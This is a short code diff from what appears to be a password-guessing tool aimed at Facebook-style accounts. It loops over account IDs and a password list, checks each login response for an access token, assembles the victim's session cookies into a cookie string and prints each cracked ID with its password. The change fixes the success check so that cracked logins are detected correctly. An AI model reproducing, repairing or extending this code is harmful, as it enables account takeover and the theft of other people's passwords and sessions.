@@ -1903,7 +1903,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             c.close()
             po = buffer.getvalue().decode('utf-8')
             load = json.loads(po)
-            if 'access_token' in q:
+            if 'access_token' in load:
                 response_data = json.loads(po)
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in load["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
